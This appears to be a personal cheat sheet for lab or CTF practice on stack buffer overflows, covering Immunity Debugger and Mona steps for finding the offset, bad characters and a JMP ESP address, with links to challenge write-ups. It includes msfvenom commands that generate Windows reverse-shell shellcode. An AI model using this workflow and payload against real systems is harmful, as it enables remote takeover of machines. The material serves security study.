# Buffer Overflow

## Immunity Debugger + Mona

- Set Mona Working Folder
```
!mona config -set workingfolder c:\mona\%p
```

- Generate pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
!mona pattern_create 3000
```

- After crash, note EIP value then identity the offset:
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 31704330
[*] Exact match at offset 2012
```

- Compare memory with bytearray to find bad chars
```
!mona bytearray
!mona compare -a esp -f c:\path\to\bytearray.bin
```

- Find JMP ESP Address
```
!mona jmp -r exp
```

- Generate shellcode
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f c -b "\x00"
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -b "\x00" -f python EXITFUNC=thread
```

- Generate byte string
```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

## Links
___
### Guides

### Writeups
- https://cd6629.gitbook.io/ctfwriteups/buffer-overflow-wlk/brainstorm-w
- https://noxious.tech/posts/Brainstorm/